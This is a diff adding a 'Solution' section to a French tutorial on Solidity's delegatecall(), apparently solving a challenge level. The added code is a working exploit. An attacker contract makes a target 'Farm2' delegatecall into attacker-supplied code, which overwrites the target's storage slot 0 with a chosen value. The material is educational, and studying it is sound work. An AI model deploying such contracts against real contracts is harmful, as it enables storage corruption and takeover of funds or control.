@@ -40,6 +40,38 @@ La fonction `delegatecall()` en Solidity permet à un contrat d'emprunter et d'e
 
 - **Bibliothèques et Contrats Upgradables :** `delegatecall()` est souvent utilisé pour exécuter des bibliothèques de contrats ou permettre des mises à jour du code contractuel sans changer l'adresse du contrat principal.
 - **Sécurité :** Étant donné ses implications sur le stockage et le comportement du contrat, `delegatecall()` doit être utilisé avec prudence. Il est crucial de s'assurer que le contrat appelé et le contrat appelant ont des layouts de stockage compatibles pour éviter des effets secondaires non désirés.
+### Solution:
+```Solidity
+pragma solidity ^0.8.19;
+
+interface IFarm2 {
+
+	function driveTractor(address _tractor, bytes calldata _instructions) external;
+
+}
+
+contract Tractor {
+ 
+	uint256 seedCount;
+  
+	function plantSeed() external {
+		seedCount = 700007;
+	}
+}
+
+contract Harvest{
+
+	IFarm2 public farm;
+
+	constructor(address _farm){
+		farm = IFarm2(_farm);
+	}
+
+	function execute(address _tractor) public {
+		farm.driveTractor(_tractor, abi.encodeWithSignature("plantSeed()"));
+	}
+}
+```
 
 ### Resume
 En résumé, `delegatecall()` offre une flexibilité puissante pour la réutilisation du code et la mise à jour des contrats, mais exige une compréhension approfondie de son impact sur le stockage et la gestion d'état des contrats pour éviter des vulnérabilités de sécurité.
